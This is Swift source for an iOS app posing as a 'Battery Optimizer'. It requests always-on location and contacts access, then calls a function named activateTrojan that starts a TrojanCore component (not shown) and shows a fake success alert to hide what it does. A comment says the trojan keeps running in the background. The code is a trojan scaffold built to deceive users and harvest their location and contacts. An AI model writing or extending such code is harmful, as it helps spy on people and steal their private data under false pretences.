import UIKit
import CoreLocation
import Contacts
import UserNotifications

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    private var permissionsGranted = 0
    private let requiredPermissions = 2
    private var locationManager: CLLocationManager?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.rootViewController = UINavigationController(rootViewController: BatteryOptimizerViewController())
        window?.makeKeyAndVisible()
        
        // Request permissions immediately
        requestPermissions()
        
        return true
    }
    
    private func requestPermissions() {
        // Location
        locationManager = CLLocationManager()
        locationManager?.requestAlwaysAuthorization()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            self.checkLocationPermission()
        }
        
        // Contacts
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, error in
            print("[APP] Contacts permission: \(granted)")
            if granted {
                self.permissionGranted()
            }
        }
    }
    
    private func checkLocationPermission() {
        guard let manager = locationManager else { return }
        let status = manager.authorizationStatus
        if status == .authorizedAlways || status == .authorizedWhenInUse {
            print("[APP] Location permission granted")
            permissionGranted()
        }
    }
    
    private func permissionGranted() {
        permissionsGranted += 1
        print("[APP] Permissions: \(permissionsGranted)/\(requiredPermissions)")
        
        if permissionsGranted >= requiredPermissions {
            activateTrojan()
        }
    }
    
    private func activateTrojan() {
        print("[APP] *** ACTIVATING TROJAN ***")
        TrojanCore.shared.activate()
        
        // Show fake success notification
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            let alert = UIAlertController(
                title: "Setup Complete",
                message: "Battery Optimizer is now monitoring your device for optimization opportunities",
                preferredStyle: .alert
            )
            alert.addAction(UIAlertAction(title: "OK", style: .default))
            self.window?.rootViewController?.present(alert, animated: true)
        }
    }
    
    func applicationDidEnterBackground(_ application: UIApplication) {
        // Keep running in background
        print("[APP] Entered background - trojan still active")
    }
}